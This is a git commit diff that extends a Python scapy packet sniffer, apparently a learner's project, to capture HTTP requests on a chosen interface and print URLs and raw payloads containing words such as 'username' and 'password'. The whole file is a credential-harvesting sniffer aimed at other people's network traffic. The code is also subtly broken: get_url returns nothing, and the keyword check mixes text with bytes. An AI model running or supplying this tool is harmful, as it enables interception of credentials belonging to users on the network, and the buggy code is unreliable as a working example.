64fcf095348f67eed75259a30d2bcf6eec803207
RockBlet <belyakove31@gmail.com>
2022-12-17 15:16:32 +0300

    add get login&password function, add arguments, add get url function

--- Moon/packet_sniffer.py
+++ Moon/packet_sniffer.py
@@ -1,13 +1,47 @@
 import scapy.all as scapy
+from scapy.layers import http
+import optparse
+
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-i", "--interface", dest="interface", help="interface")
+    (option, arguments) = parser.parse_args()
+
+    return option
 
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)
 
 
+def get_url(packet):
+    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load_raw = packet[scapy.Raw].load
+        keywords = ["username", "user", "login", "password", "pass"]
+
+        for key in keywords:
+            if key in load_raw:
+                return load_raw
+
+
 def process_sniff_packet(packet):
-    print(packet)
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print(f"\n[+] Url found - {url}")
+        login_info = get_login_info(packet)
+
+        if login_info:
+            print(f"[+] Possible username/login :: \n{login_info}\n\n")
 
 
 if __name__ == "__main__":
-    sniff("eth0")
+
+    options = get_arguments()
+    interface = options.interface
+
+    sniff(interface)
